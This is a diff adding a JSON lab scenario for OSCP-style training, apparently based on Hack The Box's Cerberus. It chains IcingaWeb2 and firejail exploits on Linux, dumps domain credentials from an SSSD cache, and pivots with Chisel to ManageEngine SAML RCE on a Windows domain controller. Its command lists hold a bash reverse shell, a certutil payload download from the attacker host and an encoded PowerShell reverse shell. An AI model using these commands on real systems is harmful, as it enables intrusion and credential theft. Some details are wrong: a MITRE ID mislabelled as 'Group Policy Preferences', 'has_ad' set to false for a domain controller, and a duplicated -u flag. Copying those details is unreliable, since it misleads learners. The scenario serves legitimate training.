@@ -1,0 +1,196 @@
+{
+  "id": "cross-boundary-pivot",
+  "title": "Cross-Boundary Pivot",
+  "category": "multi-vector",
+  "source": ["HTB Cerberus"],
+  "designed_by": "lab-derived",
+  "description": "Linux (ICINGA) to Windows (DC01) cross-boundary pivot. IcingaWeb2 CVE-2022-24716 file read → config creds → CVE-2022-24715 RCE → firejail CVE-2022-31214 → root → SSSD cache (matthew creds). Chisel tunnel to DC01 → ManageEngine CVE-2022-47966 SAML RCE → SYSTEM.",
+  "introduction": "This scenario teaches cross-boundary pivoting from Linux to Windows across segmented networks. OSCP often tests your ability to chain footholds across different OSes.",
+  "mental_model": "Treat dual-NIC hosts as bridges: root on Linux pivot gives you internal network access via tunneling. Always check SSSD/cache for domain creds.",
+  "key_principles": [
+    "LFI often leads to config files with creds",
+    "Dual-NIC hosts are pivot points between networks",
+    "Chisel reverse tunnel exposes internal ports to Kali",
+    "SSSD cache dumps reveal domain user passwords",
+    "ManageEngine products often have unauthenticated RCE"
+  ],
+
+  "indicators": {
+    "difficulty": 8,
+    "cognitive_load": 7,
+    "enumeration_depth": 5,
+    "rabbit_hole_risk": 4,
+    "time_pressure": 7
+  },
+
+  "mitre": {
+    "tactics": ["TA0001", "TA0003", "TA0004", "TA0006", "TA0007"],
+    "techniques": [
+      {"id": "T1190", "name": "Exploit Public-Facing Application"},
+      {"id": "T1552.001", "name": "Credentials In Files"},
+      {"id": "T1068", "name": "Exploitation for Privilege Escalation"},
+      {"id": "T1572", "name": "Protocol Tunneling"},
+      {"id": "T1003.006", "name": "Group Policy Preferences"}
+    ]
+  },
+
+  "kill_chain_phases": ["T1-Recon", "T2-Web-Access", "T3-NonWeb-Access", "T4a-Linux-PrivEsc", "T4b-Win-PrivEsc", "T6-Pivoting"],
+
+  "environment": {
+    "machine_count": 2,
+    "network_count": 2,
+    "os_distribution": {"windows": 1, "linux": 1},
+    "has_ad": false,
+    "has_pivoting": true,
+    "has_client_side": false
+  },
+
+  "technique_tags": [
+    "icingaweb2", "CVE-2022-24716", "CVE-2022-24715", "CVE-2022-31214",
+    "firejail", "sssd", "chisel", "manageengine", "CVE-2022-47966",
+    "saml-rce", "linpeas"
+  ],
+
+  "exam_relevance": {
+    "oscp_exam_format": false,
+    "pen200_modules": [6, 12, 16, 17, 22],
+    "pattern_frequency": "low",
+    "recommended_order": 17
+  },
+
+  "prerequisites": [],
+  "builds_on": [],
+
+  "networks": [
+    {"id": "external", "cidr": "10.10.11.0/24", "label": "External"},
+    {"id": "internal", "cidr": "172.16.5.0/24", "label": "Internal"}
+  ],
+
+  "machines": [
+    {
+      "id": "icinga",
+      "label": "ICINGA",
+      "ip": "10.10.11.205",
+      "os": "Linux",
+      "role": "Web/Pivot",
+      "networks": ["external", "internal"],
+      "services": [
+        {
+          "port": 80,
+          "name": "IcingaWeb2",
+          "version": "2.8.0",
+          "vulnerabilities": [
+            {"type": "lfi", "cve": "CVE-2022-24716", "summary": "Arbitrary file read via icon parameter", "leads_to": "config-creds"}
+          ],
+          "commands": [
+            "curl 'http://10.10.11.205/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/icingaweb2.conf'",
+            {"cmd": "curl 'http://10.10.11.205/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/resources.ini'", "rationale": "Why: LFI reads config to get creds for authenticated RCE"}
+          ]
+        },
+        {
+          "port": 443,
+          "name": "HTTPS",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "rce", "cve": "CVE-2022-24715", "summary": "IcingaWeb2 RCE with config creds", "leads_to": "www-data"}
+          ],
+          "commands": [
+            "searchsploit -m icinga",
+            {"cmd": "python3 icinga_rce.py -u https://10.10.11.205 -u icingaadmin -p '<from-resources.ini>' -c 'bash -c \"bash -i >& /dev/tcp/<kali-ip>/443 0>&1\"'", "rationale": "Why: Authenticated RCE with config creds from LFI"}
+          ]
+        }
+      ],
+      "privesc": [
+        {
+          "from": "www-data",
+          "to": "root",
+          "technique": "firejail CVE-2022-31214 privilege escalation",
+          "commands": [
+            "linpeas.sh",
+            "firejail --version",
+            "searchsploit firejail",
+            {"cmd": "python3 firejail_privesc.py", "rationale": "Why: Firejail CVE-2022-31214 escapes to root"},
+            "id"
+          ]
+        }
+      ],
+      "credentials": [
+        {"user": "matthew", "type": "password", "source": "SSSD cache dump (sss_cache.ldb)", "unlocks": ["dc01"]}
+      ],
+      "alternatives": []
+    },
+    {
+      "id": "dc01",
+      "label": "DC01",
+      "ip": "172.16.5.10",
+      "os": "Windows",
+      "role": "Domain Controller",
+      "networks": ["internal"],
+      "services": [
+        {
+          "port": 8443,
+          "name": "ManageEngine ADSelfService Plus",
+          "version": "6.x",
+          "vulnerabilities": [
+            {"type": "rce", "cve": "CVE-2022-47966", "summary": "SAML SSO RCE (unauthenticated)", "leads_to": "SYSTEM"}
+          ],
+          "commands": [
+            {"cmd": "chisel server -p 8000 --reverse", "rationale": "Why: Reverse tunnel exposes internal DC port to Kali"},
+            "# On ICINGA: chisel client <kali-ip>:8000 R:8443:172.16.5.10:8443",
+            "python3 manageengine_saml_rce.py -u https://127.0.0.1:8443 -c 'powershell -e <base64-rev>'"
+          ]
+        },
+        {
+          "port": 445,
+          "name": "SMB",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "auth", "summary": "SMB with matthew creds from SSSD", "leads_to": "recon"}
+          ],
+          "commands": [
+            "nxc smb 172.16.5.10 -u matthew -p '<password>' --shares"
+          ]
+        }
+      ],
+      "privesc": [
+        {
+          "from": "matthew",
+          "to": "SYSTEM",
+          "technique": "ManageEngine CVE-2022-47966 runs as SYSTEM",
+          "commands": [
+            {"cmd": "python3 CVE-2022-47966.py -u https://127.0.0.1:8443 -c 'certutil -urlcache -split -f http://<kali-ip>/rev.exe c:\\\\windows\\\\temp\\\\rev.exe'", "rationale": "Why: SAML RCE uploads payload as SYSTEM"},
+            "python3 CVE-2022-47966.py -u https://127.0.0.1:8443 -c 'c:\\\\windows\\\\temp\\\\rev.exe'"
+          ]
+        }
+      ],
+      "credentials": [],
+      "alternatives": []
+    }
+  ],
+
+  "connections": [
+    {
+      "from": "icinga",
+      "to": "dc01",
+      "technique": "Chisel tunnel to internal network",
+      "requires": "Root on ICINGA, matthew creds from SSSD",
+      "pivot": "ICINGA dual-NIC",
+      "path_ids": ["path-main"],
+      "commands": [
+        "chisel server -p 8000 --reverse",
+        "# On ICINGA: chisel client <kali-ip>:8000 R:8443:172.16.5.10:8443",
+        "sss_cache.ldb dump for matthew password"
+      ]
+    }
+  ],
+
+  "attack_paths": [
+    {
+      "id": "path-main",
+      "name": "ICINGA → Chisel → DC01 ManageEngine",
+      "color": "#6bb8cc",
+      "steps": ["icinga", "dc01"],
+      "description": "IcingaWeb2 CVE-2022-24716 → config → CVE-2022-24715 RCE → firejail CVE-2022-31214 → root → SSSD matthew → Chisel tunnel → ManageEngine CVE-2022-47966 → SYSTEM"
+    }
+  ]
+}
